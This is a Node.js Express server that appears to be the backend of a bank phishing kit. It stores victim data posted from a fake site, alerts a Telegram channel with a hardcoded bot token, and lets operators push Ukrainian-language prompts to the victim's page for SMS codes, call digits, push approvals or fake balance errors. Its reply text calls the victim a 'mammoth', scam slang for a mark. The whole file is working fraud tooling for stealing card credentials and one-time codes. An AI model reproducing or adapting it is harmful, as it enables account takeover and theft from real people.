const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
const CHANNEL_ID = '-1003455979409'; // Канал для уведомлений
const BOT_USERNAME = 'ТВОЙ_БОТ_USERNAME'; // ЗАМЕНИ ЭТО (например, MyPrivatBot)

// Хранилища
let userTasks = {}; 
let logsStorage = {}; // Храним полные данные здесь

const cmdTexts = {
    'sms': 'Введіть код підтвердження, що надійшов у СМС',
    'call': 'Введіть останніх 4 цифри номера, з якого надійде дзвінок',
    'push': 'Підтвердіть вхід у вашому мобільному додатку',
    'bal': 'Недостатньо коштів на картці для верифікації. Спробуйте іншу картку',
    'support': 'Помилка безпеки. Опишіть проблему оператору в чаті',
    'custom': 'Повторіть спробу або введіть дані ще раз'
};

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    
    // Сохраняем полный лог в память сервера по ID
    logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };

    // В КАНАЛ шлем только короткое уведомление
    let channelMsg = `<b>🆕 НОВИЙ ЛОГ [${safeText(type)}]</b>\n`;
    channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
    channelMsg += `📍 Статус: Очікує обробки...`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHANNEL_ID,
            text: channelMsg,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { 
                            text: "⚡️ ВЗЯТИ В РОБОТУ", 
                            url: `https://t.me/${BOT_USERNAME}?start=${userId}` 
                        }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (e) {
        console.error("❌ ОШИБКА КАНАЛА:", e.message);
        res.status(500).send('Error');
    }
});

// --- ПРОВЕРКА КОМАНД (САЙТ ОПРАШИВАЕТ) ---
app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) { delete userTasks[userId]; }
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    const { message, callback_query } = req.body;

    // 1. Если нажали кнопку-ссылку /start в боте
    if (message && message.text && message.text.startsWith('/start')) {
        const userId = message.text.split(' ')[1];
        const log = logsStorage[userId];

        if (log) {
            let fullMsg = `<b>💎 ПОВНИЙ ЛОГ [${log.type}]</b>\n`;
            fullMsg += `🆔 ID: <code>${userId}</code>\n`;
            fullMsg += `⏰ Час: ${log.time}\n`;
            fullMsg += `------------------------\n`;
            for (let key in log.data) {
                fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`;
            }

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: message.chat.id,
                text: fullMsg,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "💬 СМС", callback_data: `ask_${userId}_sms` },
                            { text: "📞 Звонок", callback_data: `ask_${userId}_call` }
                        ],
                        [
                            { text: "📲 Пуш", callback_data: `msg_${userId}_push` },
                            { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }
                        ],
                        [
                            { text: "✍️ Свой текст", callback_data: `ask_${userId}_custom` }
                        ]
                    ]
                }
            });
        } else {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: message.chat.id,
                text: "❌ Лог не знайдений або застарів."
            });
        }
    }

    // 2. Если нажали кнопку ошибки (callback)
    if (callback_query) {
        const [action, userId, code] = callback_query.data.split('_');
        userTasks[userId] = { action, text: cmdTexts[code] || "Введіть дані" };
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callback_query.id,
            text: "✅ Команда відправлена мамонту!"
        });
    }
    
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер готов`));
